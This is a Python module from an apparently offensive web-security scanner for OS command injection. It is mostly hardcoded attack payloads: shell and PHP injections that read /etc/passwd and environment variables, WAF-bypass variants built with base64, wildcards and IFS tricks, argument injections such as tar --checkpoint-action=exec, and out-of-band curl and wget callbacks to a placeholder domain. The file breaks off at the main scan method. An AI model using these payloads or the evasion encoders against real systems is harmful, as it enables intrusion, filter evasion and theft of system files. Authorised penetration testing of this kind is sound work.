"""
Command Injection Scanner v3.0 GOD-MODE

Enterprise-grade OS Command Injection scanner with:
- Multi-OS Support: Linux, Windows, macOS, FreeBSD, Solaris
- 15+ Injection Contexts: Shell, subprocess, backticks, $(), pipes, etc.
- Blind Detection: Time-based, DNS OOB, HTTP OOB, file-based
- WAF Detection & Bypass: 12+ WAF signatures with evasion payloads
- Shell-Specific Payloads: bash, sh, cmd.exe, PowerShell, zsh
- Encoding Mutations: URL, double-URL, Unicode, hex, octal
- Argument Injection: --help, -v, --, environment variables
- Cross-Validation: Multiple confirmation for high confidence
- Polyglot Payloads: Work across multiple OS/shell combinations
"""

from __future__ import annotations

import base64
import random
import re
import string
import time
from dataclasses import dataclass
from enum import Enum, auto
from typing import TYPE_CHECKING, Any, Optional
from urllib.parse import parse_qs, urlencode, urljoin, urlparse

import httpx

from scanning.findings import Finding, VulnType, VulnCategory
from scanning.vuln_scanner import ScanModule
from scanning.scan_context import ScanContext
from utils.logger import get_logger
from utils.scan_client import get_scan_client
from utils.network_utils import resolve_base_url
from utils.rate_limiter import RateLimiter
from utils.scanner_helpers import WAFType as BaseWAFType, WAFDetector as BaseWAFDetector
from utils.payload_encoder import PayloadEncoder as BasePayloadEncoder
from utils.payload_library import PayloadLibrary, PayloadCategory

if TYPE_CHECKING:
    from core.config_manager import Settings

logger = get_logger(__name__)

# Version constant
CMDI_SCANNER_VERSION = "3.0.0-GOD-MODE"


class OSType(Enum):
    """Target operating system types."""
    UNKNOWN = auto()
    LINUX = auto()
    WINDOWS = auto()
    MACOS = auto()
    FREEBSD = auto()
    SOLARIS = auto()


class ShellType(Enum):
    """Shell interpreter types."""
    UNKNOWN = auto()
    BASH = auto()
    SH = auto()
    ZSH = auto()
    CMD = auto()
    POWERSHELL = auto()
    FISH = auto()


class InjectionContext(Enum):
    """Command injection context types."""
    DIRECT = auto()              # Direct command execution
    SHELL_COMMAND = auto()       # system(), exec(), etc.
    SUBPROCESS = auto()          # subprocess.Popen, etc.
    BACKTICK = auto()            # `command`
    DOLLAR_PAREN = auto()        # $(command)
    PIPE = auto()                # cmd | injection
    SEMICOLON = auto()           # cmd; injection
    AND = auto()                 # cmd && injection
    OR = auto()                  # cmd || injection
    NEWLINE = auto()             # cmd\ninjection
    ARGUMENT = auto()            # cmd --arg=injection
    ENVIRONMENT = auto()         # ENV=injection cmd
    HEREDOC = auto()             # <<EOF injection
    EVAL = auto()                # eval "injection"
    TEMPLATE = auto()            # ${injection}
    PHP_FUNCTION = auto()        # PHP system(), exec(), shell_exec(), passthru()


# WAFType - Use centralized version from scanner_helpers
class WAFType(Enum):
    """Web Application Firewall types - wraps centralized version."""
    NONE = auto()
    CLOUDFLARE = auto()
    AKAMAI = auto()
    AWS_WAF = auto()
    IMPERVA = auto()
    F5_BIG_IP = auto()
    MODSECURITY = auto()
    SUCURI = auto()
    FORTINET = auto()
    BARRACUDA = auto()
    AZURE_WAF = auto()
    WORDFENCE = auto()
    COMODO = auto()
    UNKNOWN = auto()

    @classmethod
    def from_base(cls, base_waf: BaseWAFType) -> "WAFType":
        """Convert from centralized WAFType."""
        mapping = {
            BaseWAFType.CLOUDFLARE: cls.CLOUDFLARE,
            BaseWAFType.AKAMAI: cls.AKAMAI,
            BaseWAFType.AWS_WAF: cls.AWS_WAF,
            BaseWAFType.IMPERVA: cls.IMPERVA,
            BaseWAFType.F5_BIG_IP: cls.F5_BIG_IP,
            BaseWAFType.MODSECURITY: cls.MODSECURITY,
            BaseWAFType.SUCURI: cls.SUCURI,
            BaseWAFType.FORTINET: cls.FORTINET,
            BaseWAFType.BARRACUDA: cls.BARRACUDA,
            BaseWAFType.AZURE_WAF: cls.AZURE_WAF,
            BaseWAFType.WORDFENCE: cls.WORDFENCE,
            BaseWAFType.UNKNOWN: cls.UNKNOWN,
            BaseWAFType.NONE: cls.NONE,
        }
        return mapping.get(base_waf, cls.UNKNOWN)


@dataclass
class CMDiFinding:
    """Command injection finding with detailed metadata."""
    url: str
    parameter: str
    payload: str
    os_type: OSType
    shell_type: ShellType
    context: InjectionContext
    detection_method: str
    evidence: list[str]
    confidence: int  # 0-100
    waf_detected: Optional[WAFType] = None
    waf_bypassed: bool = False
    response_time: float = 0.0
    baseline_time: float = 0.0


class WAFDetector:
    """
    WAF detection for Command Injection - uses centralized BaseWAFDetector.

    Provides backward-compatible API while leveraging comprehensive
    signatures from utils/scanner_helpers.py.
    """

    @classmethod
    def detect(cls, response: httpx.Response) -> Optional[WAFType]:
        """Detect WAF from response using centralized detector."""
        base_waf_type, _ = BaseWAFDetector.detect(response)
        if base_waf_type == BaseWAFType.NONE:
            return None
        return WAFType.from_base(base_waf_type)

    @classmethod
    def is_blocked(cls, response: httpx.Response) -> bool:
        """Check if request was blocked by WAF."""
        _, is_blocked = BaseWAFDetector.detect(response)
        return is_blocked


class PayloadMutator:
    """
    Generates encoding mutations for WAF bypass.

    Uses centralized BasePayloadEncoder for common encodings,
    with command-injection-specific methods for shell bypass.
    """

    @staticmethod
    def url_encode(payload: str) -> str:
        """URL encode payload."""
        return BasePayloadEncoder.url_encode(payload)

    @staticmethod
    def double_url_encode(payload: str) -> str:
        """Double URL encode."""
        return BasePayloadEncoder.double_url_encode(payload)
    
    @staticmethod
    def unicode_encode(payload: str) -> str:
        """Unicode encode critical characters."""
        result = ""
        for c in payload:
            if c in ";|&`$(){}[]'\"\\<>":
                result += f"\\u{ord(c):04x}"
            else:
                result += c
        return result
    
    @staticmethod
    def hex_encode_bash(payload: str) -> str:
        """Hex encode for bash $'\\x..'."""
        hex_chars = ''.join(f"\\x{ord(c):02x}" for c in payload)
        return f"$'{hex_chars}'"
    
    @staticmethod
    def octal_encode(payload: str) -> str:
        """Octal encode for bash $'\\...'."""
        octal_chars = ''.join(f"\\{ord(c):03o}" for c in payload)
        return f"$'{octal_chars}'"
    
    @staticmethod
    def base64_bash(cmd: str) -> str:
        """Base64 encoded command for bash."""
        encoded = base64.b64encode(cmd.encode()).decode()
        return f"echo {encoded}|base64 -d|bash"
    
    @staticmethod
    def base64_powershell(cmd: str) -> str:
        """Base64 encoded command for PowerShell."""
        encoded = base64.b64encode(cmd.encode('utf-16-le')).decode()
        return f"powershell -enc {encoded}"
    
    @staticmethod
    def char_by_char(cmd: str) -> str:
        """Build command char by char."""
        parts = []
        for c in cmd:
            if c.isalpha():
                parts.append(f"$(printf '\\x{ord(c):02x}')")
            else:
                parts.append(c)
        return ''.join(parts)
    
    @staticmethod
    def wildcard_bypass(cmd: str) -> str:
        """Use wildcards to bypass filters."""
        # cat → /???/c?t, ls → /???/l?
        replacements = {
            'cat': '/???/c?t',
            'ls': '/???/l?',
            'id': '/???/bin/i?',
            'whoami': '/???/bin/whoa??',
            'pwd': '/???/pw?',
        }
        for orig, repl in replacements.items():
            cmd = cmd.replace(orig, repl)
        return cmd
    
    @staticmethod
    def environment_bypass(cmd: str) -> str:
        """Use environment variables for bypass."""
        # ${PATH:0:1} = '/' on most systems
        cmd = cmd.replace('/', '${PATH:0:1}')
        return cmd
    
    @staticmethod
    def insert_junk(payload: str) -> str:
        """Insert junk characters that are ignored."""
        # Insert empty variables ${} or $@ between characters
        result = ""
        for i, c in enumerate(payload):
            result += c
            if i % 2 == 0 and c.isalpha():
                result += "${z}"  # Empty variable
        return result
    
    @staticmethod
    def newline_separator(cmd: str) -> str:
        """Use newline as command separator."""
        return f"\n{cmd}\n"
    
    @staticmethod
    def tab_separator(cmd: str) -> str:
        """Use tab as word separator."""
        return cmd.replace(' ', '\t')
    
    @classmethod
    def get_all_mutations(cls, payload: str) -> list[str]:
        """Generate all mutation variants."""
        mutations = [
            payload,
            cls.url_encode(payload),
            cls.double_url_encode(payload),
            cls.unicode_encode(payload),
            cls.insert_junk(payload),
            cls.tab_separator(payload),
            cls.wildcard_bypass(payload),
            cls.environment_bypass(payload),
        ]
        return list(set(mutations))  # Remove duplicates


class CommandInjectionScanner(ScanModule):
    """
    Command Injection Scanner v3.0 GOD-MODE
    
    Features:
    - Multi-OS detection and exploitation (Linux, Windows, macOS, BSD)
    - 15+ injection contexts with context-specific payloads
    - WAF detection and bypass (12+ WAFs)
    - Blind injection (time-based, OOB, file-based)
    - Shell-specific payloads (bash, sh, cmd, PowerShell, zsh)
    - Polyglot payloads for cross-platform attacks
    - Encoding mutations for filter bypass
    - Argument injection attacks
    - Cross-validation for confidence scoring
    - Anti-false-positive heuristics
    """
    
    name = "cmdi_scanner"
    
    # Minimum confidence threshold to report
    # FIX 2026-02-16: Changed from INT (70) to FLOAT (0.70) for validation pipeline
    MIN_CONFIDENCE_THRESHOLD = 0.70
    
    # Parameters commonly vulnerable to command injection
    CMDI_PARAMS = [
        # Direct command execution
        "cmd", "exec", "command", "execute", "run", "system", "shell",
        # PHP-specific command execution functions (DVWA, bWAPP, Mutillidae)
        "shell_exec", "passthru", "popen", "proc_open", "pcntl_exec",
        "backtick", "eval", "assert", "create_function", "call_user_func",
        "preg_replace", "php_code", "code", "expression",
        # Network utilities
        "ping", "host", "ip", "hostname", "port", "target", "address",
        "nslookup", "dig", "traceroute", "netstat", "curl", "wget",
        # File operations
        "file", "filename", "filepath", "path", "dir", "directory",
        "folder", "document", "doc", "upload", "download", "read",
        "write", "copy", "move", "delete", "remove", "create", "open",
        "include", "require", "load", "import", "source",
        # Process operations
        "daemon", "service", "process", "pid", "kill", "start", "stop",
        "restart", "status", "log", "logs", "output", "result",
        # Data processing
        "data", "input", "output", "query", "search", "filter", "sort",
        "format", "convert", "parse", "encode", "decode", "compress",
        # Git/VCS operations
        "clone", "pull", "push", "branch", "commit", "repo", "repository",
        # Archive operations
        "zip", "unzip", "tar", "archive", "extract", "backup",
        # PDF/Document generation
        "pdf", "print", "render", "generate", "export", "template",
        # Image processing
        "image", "img", "resize", "crop", "convert", "thumbnail",
        # Misc
        "to", "from", "src", "dst", "source", "destination", "root",
        "base", "home", "temp", "tmp", "var", "opt", "usr", "etc",
    ]

    # G-05 FIX: Known CMDi-vulnerable endpoints to proactively test
    # These are common paths in training apps and real-world vulnerable apps
    KNOWN_CMDI_PATHS = [
        # DVWA (Damn Vulnerable Web Application)
        "/vulnerabilities/exec/",
        "/dvwa/vulnerabilities/exec/",
        # bWAPP (buggy Web Application)
        "/bWAPP/commandi.php",
        "/commandi.php",
        "/bWAPP/commandi_blind.php",
        "/commandi_blind.php",
        "/bWAPP/os_command.php",
        "/os_command.php",
        # Mutillidae
        "/mutillidae/index.php?page=dns-lookup.php",
        "/index.php?page=dns-lookup.php",
        "/mutillidae/index.php?page=text-file-viewer.php",
        # WebGoat
        "/WebGoat/CommandInjection/",
        "/WebGoat/attack?Screen=CommandInjection",
        # Generic command execution endpoints
        "/ping.php",
        "/exec.php",
        "/cmd.php",
        "/shell.php",
        "/command.php",
        "/run.php",
        "/execute.php",
        "/system.php",
        # Network utilities
        "/traceroute.php",
        "/nslookup.php",
        "/dig.php",
        "/whois.php",
        "/network_tools.php",
        "/tools/ping",
        "/tools/traceroute",
        "/tools/nslookup",
        "/tools/whois",
        "/admin/ping",
        "/admin/exec",
        "/admin/shell",
        # API endpoints
        "/api/ping",
        "/api/exec",
        "/api/command",
        "/api/run",
        "/api/v1/ping",
        "/api/v1/exec",
        # Backup/admin tools
        "/backup.php",
        "/admin/backup",
        "/admin/shell",
        "/admin/cmd",
        "/cgi-bin/ping.cgi",
        "/cgi-bin/traceroute.cgi",
    ]

    # OS-specific detection payloads
    OS_DETECTION_PAYLOADS = {
        OSType.LINUX: [
            ("; cat /etc/os-release", ["ID=", "VERSION_ID=", "NAME="]),
            ("; uname -a", ["Linux", "GNU"]),
            ("; cat /proc/version", ["Linux version"]),
        ],
        OSType.WINDOWS: [
            ("& ver", ["Microsoft Windows", "Version"]),
            ("| systeminfo", ["Microsoft Windows", "OS Name"]),
            ("& echo %OS%", ["Windows_NT"]),
        ],
        OSType.MACOS: [
            ("; sw_vers", ["ProductName", "Mac OS", "macOS"]),
            ("; uname -a", ["Darwin"]),
        ],
        OSType.FREEBSD: [
            ("; uname -a", ["FreeBSD"]),
            ("; cat /etc/freebsd-update.conf", ["FreeBSD"]),
        ],
    }
    
    # Result-based payloads by OS
    RESULT_PAYLOADS = {
        OSType.LINUX: [
            # id command
            ("; id", ["uid=", "gid=", "groups="]),
            ("| id", ["uid=", "gid="]),
            ("|| id", ["uid=", "gid="]),
            ("&& id", ["uid=", "gid="]),
            ("`id`", ["uid=", "gid="]),
            ("$(id)", ["uid=", "gid="]),
            ("\n id \n", ["uid=", "gid="]),
            ("{id,}", ["uid=", "gid="]),
            # whoami
            ("; whoami", ["root", "www-data", "apache", "nginx", "ubuntu", "admin"]),
            ("| whoami", ["root", "www-data"]),
            ("$(whoami)", ["root", "www-data"]),
            # uname
            ("; uname -a", ["Linux", "GNU"]),
            ("| uname", ["Linux"]),
            # cat files
            ("; cat /etc/passwd", ["root:", "daemon:", "bin:", "sys:"]),
            ("| cat /etc/passwd", ["root:", "daemon:"]),
            ("$(cat /etc/passwd)", ["root:", "daemon:"]),
            # ls
            ("; ls -la /", ["bin", "etc", "home", "root", "var"]),
            ("| ls /", ["bin", "etc"]),
            # pwd
            ("; pwd", ["/"]),
            ("$(pwd)", ["/"]),
            # env
            ("; env", ["PATH=", "HOME=", "USER="]),
            ("| printenv", ["PATH="]),
        ],
        OSType.WINDOWS: [
            # dir
            ("| dir", ["Volume", "Directory of"]),
            ("& dir", ["Volume", "Directory"]),
            ("|| dir", ["Volume", "Directory"]),
            ("&& dir", ["Volume", "Directory"]),
            # whoami
            ("| whoami", ["\\", "AUTHORITY"]),
            ("& whoami", ["\\", "NT AUTHORITY"]),
            # systeminfo (partial)
            ("& hostname", []),  # Any output
            # echo
            ("& echo %USERNAME%", []),
            ("& echo %COMPUTERNAME%", []),
            # type
            ("| type C:\\Windows\\System32\\drivers\\etc\\hosts", ["localhost"]),
            ("& type C:\\Windows\\win.ini", ["fonts", "extensions"]),
            # cmd specific
            ("& set", ["COMPUTERNAME=", "OS=", "PATH="]),
            # PowerShell
            ("| powershell -c \"whoami\"", ["\\", "AUTHORITY"]),
            ("& powershell Get-Process", ["Handles", "PM", "WS"]),
        ],
        OSType.MACOS: [
            ("; id", ["uid=", "gid="]),
            ("; whoami", ["root", "_www"]),
            ("; sw_vers", ["ProductName", "ProductVersion"]),
            ("; ls /", ["Applications", "System", "Users", "bin"]),
            ("$(id)", ["uid=", "gid="]),
        ],
    }
    
    # Time-based blind payloads
    TIME_PAYLOADS = {
        OSType.LINUX: [
            ("; sleep {delay}", "sleep"),
            ("| sleep {delay}", "sleep"),
            ("|| sleep {delay}", "sleep"),
            ("&& sleep {delay}", "sleep"),
            ("`sleep {delay}`", "sleep"),
            ("$(sleep {delay})", "sleep"),
            ("\nsleep {delay}\n", "sleep"),
            # Alternative time delays
            ("; ping -c {delay} 127.0.0.1", "ping"),
            ("| timeout {delay}", "timeout"),
            ("; read -t {delay}", "read"),
        ],
        OSType.WINDOWS: [
            ("| ping -n {delay} 127.0.0.1", "ping"),
            ("& ping -n {delay} 127.0.0.1", "ping"),
            ("|| ping -n {delay} 127.0.0.1", "ping"),
            ("&& ping -n {delay} 127.0.0.1", "ping"),
            ("| timeout /t {delay} /nobreak", "timeout"),
            ("& waitfor /t {delay} pause", "waitfor"),
            # PowerShell
            ("| powershell Start-Sleep {delay}", "powershell_sleep"),
            ("& powershell -c \"Start-Sleep {delay}\"", "powershell_sleep"),
        ],
        OSType.MACOS: [
            ("; sleep {delay}", "sleep"),
            ("| sleep {delay}", "sleep"),
            ("$(sleep {delay})", "sleep"),
            ("; ping -c {delay} 127.0.0.1", "ping"),
        ],
    }
    
    # Polyglot payloads (work on multiple OS)
    POLYGLOT_PAYLOADS = [
        # Work on both Linux and Windows
        ("| echo CMDI_MARKER_{marker}", ["CMDI_MARKER_{marker}"]),
        ("& echo CMDI_MARKER_{marker}", ["CMDI_MARKER_{marker}"]),
        # Semicolon works on Linux, might work on Windows in some contexts
        ("; echo CMDI_MARKER_{marker}", ["CMDI_MARKER_{marker}"]),
        # Newline universal
        ("\necho CMDI_MARKER_{marker}\n", ["CMDI_MARKER_{marker}"]),
        # 2026-02-12: Additional polyglots
        ("|| echo CMDI_MARKER_{marker}", ["CMDI_MARKER_{marker}"]),  # OR
        ("&& echo CMDI_MARKER_{marker}", ["CMDI_MARKER_{marker}"]),  # AND
        ("`echo CMDI_MARKER_{marker}`", ["CMDI_MARKER_{marker}"]),  # Backtick
        ("$(echo CMDI_MARKER_{marker})", ["CMDI_MARKER_{marker}"]),  # Subshell
        # Windows-specific
        ("& echo CMDI_MARKER_{marker} &", ["CMDI_MARKER_{marker}"]),  # Background
        ("| cmd /c echo CMDI_MARKER_{marker}", ["CMDI_MARKER_{marker}"]),  # cmd.exe
        ("| powershell -c echo CMDI_MARKER_{marker}", ["CMDI_MARKER_{marker}"]),  # PowerShell
    ]

    # Windows-specific bypass payloads (2026-02-12)
    WINDOWS_BYPASS_PAYLOADS = [
        # Caret escape
        ("& w^h^o^a^m^i", []),
        ("& who^ami", []),
        # Double quotes
        ("& \"whoami\"", []),
        # Environment variable expansion
        ("& %COMSPEC% /c whoami", []),
        ("& %SystemRoot%\\System32\\cmd.exe /c whoami", []),
        # Percent encoding
        ("& w%EMPTY%hoami", []),
        # PowerShell encoded
        ("& powershell -enc dwBoAG8AYQBtAGkA", []),  # whoami base64
        # ForEach loop
        ("& for /f %a in ('whoami') do echo %a", []),
        # Call command
        ("& call whoami", []),
        # Start command
        ("& start /b cmd /c whoami", []),
        # Comma separator
        ("& cmd,/c,whoami", []),
    ]

    # ==========================================================================
    # PHP-SPECIFIC COMMAND INJECTION PAYLOADS (2026-02-16)
    # For DVWA, bWAPP, Mutillidae, and legacy PHP applications
    # ==========================================================================

    PHP_CMDI_PAYLOADS = [
        # PHP system() function injection - most common
        ('"; system("id"); //', ["uid=", "gid="]),
        ("'; system('id'); //", ["uid=", "gid="]),
        ('"; system("whoami"); //', ["root", "www-data", "apache"]),
        ("'; system('whoami'); //", ["root", "www-data", "apache"]),
        ('"; system("cat /etc/passwd"); //', ["root:", "daemon:"]),

        # PHP exec() function injection
        ('"; exec("id"); //', ["uid="]),
        ("'; exec('id'); //", ["uid="]),
        ('"; echo exec("id"); //', ["uid="]),
        ("'; print exec('whoami'); //", ["root", "www-data"]),

        # PHP shell_exec() function injection
        ('"; echo shell_exec("id"); //', ["uid="]),
        ("'; echo shell_exec('id'); //", ["uid="]),
        ('"; $out=shell_exec("id"); echo $out; //', ["uid="]),

        # PHP passthru() function injection
        ('"; passthru("id"); //', ["uid="]),
        ("'; passthru('id'); //", ["uid="]),

        # PHP backtick execution (equivalent to shell_exec)
        ('"; echo `id`; //', ["uid="]),
        ("'; echo `whoami`; //", ["root", "www-data"]),
        ('"; $x=`cat /etc/passwd`; echo $x; //', ["root:"]),

        # PHP popen() function injection
        ('"; $fp=popen("id","r"); echo fread($fp,1024); //', ["uid="]),

        # Newline/semicolon injection (common in ping, nslookup commands)
        ("\nid\n", ["uid="]),
        ("\nwhoami\n", ["root", "www-data"]),
        ("\ncat /etc/passwd\n", ["root:", "daemon:"]),
        (";\nid\n;", ["uid="]),

        # Pipe injection
        ("| id", ["uid="]),
        ("| whoami", ["root", "www-data"]),
        ("| cat /etc/passwd", ["root:", "daemon:"]),

        # Semicolon injection (most common in PHP)
        ("; id", ["uid="]),
        ("; whoami", ["root", "www-data"]),
        ("; cat /etc/passwd", ["root:"]),

        # Backtick injection in string context
        ("`id`", ["uid="]),
        ("`whoami`", ["root", "www-data"]),

        # $() subshell injection
        ("$(id)", ["uid="]),
        ("$(whoami)", ["root", "www-data"]),

        # Double quote breakout
        ('" | id #', ["uid="]),
        ('" ; id #', ["uid="]),
        ('" `id` #', ["uid="]),

        # Single quote breakout
        ("' | id #", ["uid="]),
        ("' ; id #", ["uid="]),
        ("' `id` #", ["uid="]),

        # Comment termination
        ("# | id\n", ["uid="]),
        ("/* | id */", ["uid="]),

        # Concatenation bypass
        ("'; $a='i'; $b='d'; system($a.$b); //", ["uid="]),

        # Array parameter injection (PHP-specific)
        # When param[]=value is used
    ]

    # PHP function output detection patterns
    PHP_DETECTION_PATTERNS = {
        "php_errors": [
            "PHP Warning:",
            "PHP Fatal error:",
            "PHP Parse error:",
            "PHP Notice:",
            "Call to undefined function",
            "Cannot execute a blank command",
            "sh: ",
            "/bin/sh:",
            "command not found",
        ],
        "php_function_output": [
            "uid=",
            "gid=",
            "groups=",
            "root:",
            "daemon:",
            "www-data",
            "apache",
            "nginx",
        ],
        "php_version": [
            "PHP/",
            "X-Powered-By: PHP",
        ],
    }

    # ==========================================================================
    # WAF bypass payloads (2026-02-12: Expanded with advanced techniques)
    WAF_BYPASS_PAYLOADS = {
        WAFType.CLOUDFLARE: [
            (";{IFS}id", ["uid=", "gid="]),
            (";$IFS$9id", ["uid=", "gid="]),
            (";{cat,/etc/passwd}", ["root:"]),
            (";$(printf '\\x69\\x64')", ["uid="]),  # 'id' in hex
            (";i]d", ["uid="]),  # Broken command
            (";/???/??n/i?", ["uid="]),  # Wildcard bypass
            # 2026-02-12: New bypasses
            (";$'\\x69\\x64'", ["uid="]),  # $'' quoting
            (";\nid", ["uid="]),  # Newline
            (";i${a]d", ["uid="]),  # Brace expansion
            (";${!#}id", ["uid="]),  # Special vars
        ],
        WAFType.AKAMAI: [
            (";$u{id}", ["uid="]),
            (";${PATH:0:1}bin${PATH:0:1}id", ["uid="]),
            (";`echo aWQ=|base64 -d`", ["uid="]),
            (";i\\d", ["uid="]),
            # 2026-02-12: New bypasses
            (";rev<<<'di'|sh", ["uid="]),  # rev command
            (";$(base64 -d<<<aWQ=)", ["uid="]),  # Herestring
            (";{,id}", ["uid="]),  # Brace with empty
            (";$0<<<id", ["uid="]),  # Shell stdin
        ],
        WAFType.AWS_WAF: [
            (";${IFS}id", ["uid="]),
            (";'i'd", ["uid="]),
            (";\"i\"d", ["uid="]),
            (";i${z}d", ["uid="]),  # Empty variable
            # 2026-02-12: New bypasses
            (";$*id", ["uid="]),  # Special parameter
            (";i''d", ["uid="]),  # Empty quotes
            (";$(id)", ["uid="]),  # Subshell
            (";${HOME:0:0}id", ["uid="]),  # Zero-length slice
        ],
        WAFType.MODSECURITY: [
            (";{id,}", ["uid="]),
            (";/u]s]r/b]i]n/i]d", ["uid="]),
            (";$(echo aWQ=|base64 -d)", ["uid="]),
            (";%0aid%0a", ["uid="]),  # Newline encoded
            # 2026-02-12: New bypasses
            (";i${#}d", ["uid="]),  # Parameter length
            (";/???/?in/id", ["uid="]),  # Glob pattern
            (";eval id", ["uid="]),  # Via eval
            (";. /dev/stdin<<<id", ["uid="]),  # Source stdin
        ],
        WAFType.IMPERVA: [
            (";w`h`o`a`m`i", []),  # Backtick separation
            (";${@:0:1}id", ["uid="]),
            (";{i]d}", ["uid="]),
            # 2026-02-12: New bypasses
            (";id#", ["uid="]),  # Comment after
            (";id;#", ["uid="]),  # With semicolon
            (";${!x}id", ["uid="]),  # Indirect var
            (";i``d", ["uid="]),  # Empty backticks
        ],
        # 2026-02-12: Generic/Unknown WAF bypasses
        WAFType.UNKNOWN: [
            # IFS variations
            (";${IFS}id", ["uid="]),
            (";$IFS$9id", ["uid="]),
            # Quote splitting
            (";'i'd", ["uid="]),
            (";\"i\"d", ["uid="]),
            (";i''d", ["uid="]),
            # Wildcard
            (";/???/??n/i?", ["uid="]),
            (";/???/?in/id", ["uid="]),
            # Base64
            (";$(echo aWQ=|base64 -d)", ["uid="]),
            (";`echo aWQ=|base64 -d`", ["uid="]),
            # Newline/tabs
            (";\nid", ["uid="]),
            (";\tid", ["uid="]),
            # Hex encoding
            (";$'\\x69\\x64'", ["uid="]),
            (";$(printf '\\x69\\x64')", ["uid="]),
            # Env vars
            (";${PATH:0:1}bin${PATH:0:1}id", ["uid="]),
            (";${HOME:0:0}id", ["uid="]),
            # Empty vars
            (";i${z}d", ["uid="]),
            (";${!#}id", ["uid="]),
            # Brace expansion
            (";{id,}", ["uid="]),
            (";{,id}", ["uid="]),
        ],
    }
    
    # Argument injection payloads
    ARGUMENT_PAYLOADS = [
        # Common argument injections
        ("--help", ["-h", "help", "usage", "Usage", "Options"]),
        ("--version", ["version", "Version"]),
        ("-v", ["verbose", "version"]),
        ("-h", ["help", "usage"]),
        # Git argument injection
        ("--upload-pack=id", ["uid="]),
        ("--exec=id", ["uid="]),
        # curl/wget
        ("-o /tmp/pwned", []),
        ("--output=/tmp/pwned", []),
        # tar
        ("--checkpoint=1", ["checkpoint"]),
        ("--checkpoint-action=exec=id", ["uid="]),
        # zip
        ("-TT 'id'", ["uid="]),
    ]
    
    # OOB (Out-of-Band) payloads
    OOB_PAYLOADS = {
        "dns": [
            "; nslookup {marker}.{oob_domain}",
            "| dig {marker}.{oob_domain}",
            "$(host {marker}.{oob_domain})",
            "& nslookup {marker}.{oob_domain}",
        ],
        "http": [
            "; curl http://{oob_domain}/{marker}",
            "| wget http://{oob_domain}/{marker}",
            "$(curl http://{oob_domain}/{marker})",
            "& powershell Invoke-WebRequest http://{oob_domain}/{marker}",
        ],
    }
    
    def __init__(
        self,
        settings: "Settings",
        *,  # Force keyword args for DI parameters
        oob_engine: Any = None,  # Phase 8: Optional injected OOBEngine
        payload_library: Any = None,  # Phase 8: Optional injected PayloadLibrary
    ) -> None:
        # Phase 8: Pass injected dependencies to base class
        super().__init__(settings, oob_engine=oob_engine, payload_library=payload_library)
        self.timeout = settings.timeouts.request_timeout if hasattr(settings, 'timeouts') else 30.0
        self.detected_os: OSType = OSType.UNKNOWN
        self.detected_shell: ShellType = ShellType.UNKNOWN
        self.detected_waf: Optional[WAFType] = None
        self.findings: list[CMDiFinding] = []

        # THEME-1 FIX: Configurable blind detection settings (prevent premature abandonment)
        # Slower networks need longer delays; classic detection should test more payloads
        self.blind_delays = [5, 3, 2]     # TIMEOUT-FIX 2026-02-18: Reduced from [8,5,3] to prevent 480s timeout
        self.max_time_payloads = 6        # TIMEOUT-FIX 2026-02-18: Reduced from 10 to prevent timeout
        self.max_form_time_payloads = 4   # TIMEOUT-FIX 2026-02-18: Reduced from 6 to prevent timeout
        self.delay_tolerance = 0.7        # Was 0.8 - more lenient for network jitter

        # TIMEOUT-FIX 2026-02-18: Add global time limit to prevent 480s external timeout
        # See auditdocs/SQLI_CMDI_TIMEOUT_AUDIT_2026-02-18.md for details
        self._max_total_time: float = 300.0  # Max 5 minutes total scan time
        self._scan_start_time: float = 0.0
        self._progressive_findings: list[dict] = []  # Save findings progressively for recovery on timeout

        # Phase 8: Use injected payload library if available, else get singleton
        self._payload_library = self.get_payload_library() or PayloadLibrary.get_instance()

    def _get_library_cmdi_payloads(self, max_payloads: int = 20) -> list[tuple[str, list[str]]]:
        """
        Get command injection payloads from centralized PayloadLibrary.

        Returns payloads in the same tuple format as POLYGLOT_PAYLOADS:
        (payload_string, success_indicators)
        """
        try:
            payload_objects = self._payload_library.get_payload_objects(
                PayloadCategory.CMDI,
            )
            cmdi_payloads = []
            for p in payload_objects:
                # Use payload library's success_indicators or default to uid= for unix
                indicators = p.success_indicators or ["uid=", "gid="]
                cmdi_payloads.append((p.raw, indicators))
                if len(cmdi_payloads) >= max_payloads:
                    break
            if cmdi_payloads:
                return cmdi_payloads
            # Fallback to hardcoded
            return self.POLYGLOT_PAYLOADS[:max_payloads]
        except Exception as e:
            logger.debug(f"[CMDi] PayloadLibrary error, using fallback: {e}")
            return self.POLYGLOT_PAYLOADS[:max_payloads]

    def _generate_marker(self) -> str:
        """Generate unique marker for detection."""
        return ''.join(random.choices(string.ascii_uppercase + string.digits, k=12))

    def _check_time_limit(self) -> bool:
        """
        Check if scan time limit has been exceeded.

        TIMEOUT-FIX 2026-02-18: Prevents module from hitting 480s external timeout.
        See auditdocs/SQLI_CMDI_TIMEOUT_AUDIT_2026-02-18.md

        Returns:
            True if should continue scanning, False if time exceeded.
        """
        if self._scan_start_time == 0:
            return True
        elapsed = time.time() - self._scan_start_time
        if elapsed > self._max_total_time:
            logger.info(
                f"[CMDi] Total time limit reached ({elapsed:.0f}s > {self._max_total_time:.0f}s), "
                f"stopping with {len(self._progressive_findings)} findings"
            )
            return False
        return True

    def _build_early_exit_result(self, reason: str) -> dict[str, Any]:
        """Build result dict for early exit scenarios."""
        # Convert any remaining findings before exit
        self._save_progressive_findings()
        return {
            "module": self.name,
            "version": CMDI_SCANNER_VERSION,
            "findings": self._progressive_findings,
            "metadata": {
                "detected_waf": self.detected_waf.name if self.detected_waf else None,
                "detected_os": self.detected_os.name if self.detected_os != OSType.UNKNOWN else None,
                "total_tests": len(self.findings),
                "high_confidence_findings": len(self._progressive_findings),
                "early_exit": True,
                "early_exit_reason": reason,
            }
        }

    def _save_progressive_findings(self) -> None:
        """
        Convert any new findings in self.findings to dict format and save progressively.

        TIMEOUT-FIX 2026-02-18: This enables recovery of findings even if module times out.
        """
        for f in self.findings:
            if f.confidence >= self.MIN_CONFIDENCE_THRESHOLD:
                finding_dict = self._finding_to_dict(f)
                # Avoid duplicates by checking url + param
                existing_keys = {
                    (fd.get("matched_at"), fd.get("metadata", {}).get("param"))
                    for fd in self._progressive_findings
                }
                new_key = (finding_dict.get("matched_at"), finding_dict.get("metadata", {}).get("param"))
                if new_key not in existing_keys:
                    self._progressive_findings.append(finding_dict)

    async def scan(
        self,
        host: str,
        asset_data: dict[str, Any],
        rate_limiter: RateLimiter,
    ) -> dict[str, Any]:
        """
        Scan for command injection vulnerabilities.
        
        GOD-MODE scanning strategy:
        1. WAF Detection
        2. OS/Shell fingerprinting
        3. Context detection
        4. Result-based injection
        5. Time-based blind injection
        6. WAF bypass attempts (if WAF detected)
        7. Argument injection
        8. Cross-validation
        """
